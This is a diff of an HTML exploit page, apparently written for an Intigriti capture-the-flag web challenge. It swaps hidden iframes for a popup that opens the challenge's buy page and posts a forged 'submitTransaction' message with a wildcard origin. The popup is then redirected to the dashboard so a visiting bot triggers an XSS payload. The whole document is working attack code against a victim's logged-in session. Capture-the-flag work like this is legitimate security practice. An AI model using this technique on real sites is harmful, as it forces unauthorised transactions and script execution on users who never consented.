@@ -1,35 +1,28 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>Exploit Running...</h1>
+    <h1>Exploit starting...</h1>
     <script>
-        const currencies = ['1337COIN', 'BTC', 'ETH'];
-        
-        currencies.forEach((curr, index) => {
-            // Create an iframe for each currency to be safe
-            const ifr = document.createElement('iframe');
-            ifr.src = `https://challenge-0126.intigriti.io/buy.html?currency=${curr}&price=0.0001`;
-            ifr.style.display = 'none';
-            document.body.appendChild(ifr);
+        // 1. Open the buy page as a popup to ensure cookies are sent
+        const exploiter = window.open("https://challenge-0126.intigriti.io/buy.html?currency=1337COIN&price=1");
 
-            setTimeout(() => {
-                console.log(`Sending message for ${curr}`);
-                ifr.contentWindow.postMessage({
-                    type: 'submitTransaction',
-                    transaction: {
-                        toAddress: '0x1337',
-                        currency: curr,
-                        amount: 0.00000001
-                    }
-                }, '*');
-            }, 3000 + (index * 500));
-        });
-
-        // After 6 seconds, redirect the main page to the dashboard
-        // This is where the bot will actually see your nickname and trigger the XSS
         setTimeout(() => {
-            window.location.href = "https://challenge-0126.intigriti.io/dashboard.html";
-        }, 6000);
+            // 2. Trigger the transaction
+            exploiter.postMessage({
+                type: 'submitTransaction',
+                transaction: {
+                    toAddress: '0x1337',
+                    currency: '1337COIN',
+                    amount: 0.000001
+                }
+            }, '*');
+
+            // 3. Crucial: Redirect the popup to the dashboard
+            // Doing it in the popup keeps the bot "on the same site"
+            setTimeout(() => {
+                exploiter.location.href = "https://challenge-0126.intigriti.io/dashboard.html";
+            }, 2000);
+        }, 4000);
     </script>
 </body>
 </html>
